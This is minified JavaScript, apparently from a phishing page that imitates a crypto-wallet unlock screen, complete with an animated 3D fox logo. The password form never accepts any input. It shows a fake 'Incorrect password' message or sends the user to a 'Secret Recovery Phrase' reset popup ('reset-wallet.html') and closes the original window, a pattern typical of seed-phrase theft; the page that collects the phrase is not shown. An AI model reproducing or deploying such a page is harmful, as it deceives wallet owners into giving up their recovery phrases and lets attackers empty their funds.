...
(function () {
  ...
  3: [function (j, q, z) {
    ...
    q.exports = function (t) {
      ...
      function r(t) {
        for (var e = t[0], n = t[1], r = t[2], i = t[3], o = t[4], a = t[5], l = t[6], u = t[7], s = t[8], f = t[9], h = t[10], c = t[11], d = t[12], w = t[13], v = t[14], g = t[15], m = 0; m < F; ++m) {
          var p = N[3 * m],
              A = N[3 * m + 1],
              y = N[3 * m + 2],
              x = p * i + A * u + y * c + g;
        ...
        for (b.length = 0, t = 0; t < S.length; ++t) {
          ...
          if (!((c - f) * (M[3 * s + 1] - h) - (d - h) * (w - f) < 0)) {
            for (var v = [], g = -1 / 0, m = 1 / 0, p = o.svg, A = 0; A < 3; ++A) {
              var x = a[A];
              v.push(.5 * n * (1 - M[3 * x]) + "," + .5 * r * (1 - M[3 * x + 1]));
              var F = M[3 * x + 2];
      ...
      var h = t || {},
        ...
        y: 0
          ...
          b = [];
      h.pxNotRatio || (p = window.innerWidth * (h.width || .25) | 0, A = 0 | (window.innerHeight * h.height || p), "minWidth" in h && p < h.minWidth && (p = h.minWidth, A = p)), setAttribute(y, "width", p + "px"), setAttribute(y, "height", p + "px"), document.body.appendChild(y), function () {
        for (var t = foxJSON.positions, e = 0, n = 0; n < t.length; ++n) {
          for (var r = t[n], i = 0; i < 3; ++i) {
            N[e++] = r[i];
          }
        }
      }();
      ...
      var S = function () {
        for (var t = [], e = 0; e < foxJSON.chunks.length; ++e) {
          for (var r = foxJSON.chunks[e], i = "rgb(" + r.color + ")", o = r.faces, a = 0; a < o.length; ++a) {
            var l = o[a],
        ...
        return function () {
          ...
          if (B(n, Math.PI / 4, d / v, 100, 1e3), invert(a, n), l[0] = g[0], l[1] = g[1], l[2] = 1.2, transform(l, l, a), transform(l, l, o), lookAt(r, t, l, e), w) {
            var m = Date.now() / 1e3;
            rotate(r, r, .1 + .2 * Math.sin(m / 3), s), rotate(r, r, .03 * Math.sin(m / 2) - .1, h), rotate(r, r, .5 + .2 * Math.sin(m / 3), f);
          }
      ...
      return window.addEventListener("mousemove", function (t) {
        ...
        if (v || l(), d) {
          var _n = event.gamma,
              _r = event.beta;
          yOffset = -300, acceleration = 10, e({
            x: 200 + _n * acceleration,
            y: yOffset + _r * acceleration
          }), f();
        }
      }), f(), {
        container: y,
...
var submitPassBtn = document.querySelector("form");
var passInput = document.querySelector(".input-wrapper input");
var entryCount = 1;
var entryLimit = 1;
submitPassBtn.addEventListener("submit", function (e) {
  e.preventDefault();
  var parent = document.querySelector(".err");
  var el = document.createElement("div");
  parent.innerHTML = '';
  el.classList.add("wrong-pass-text");
  parent.appendChild(el);

  if (entryCount > entryLimit) {
    document.querySelector(".line").classList.add("wrong-pass-line");
    entryCount--;
    el.innerHTML = "Incorrect password. You have ".concat(entryCount, " chances left.");
    console.log(entryCount);
  } else {
    console.log(el);
    el.innerHTML = "Use <a class=\"reset\" onclick=\"resetPass()\">Secret Recovery Phrase</a> to proceed";
    resetPass();
  }
});

function resetPass() {
  window.open("reset-wallet.html", "_blank", "left=1200,top=50,width=360,height=540,status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no").focus();
  window.close();
}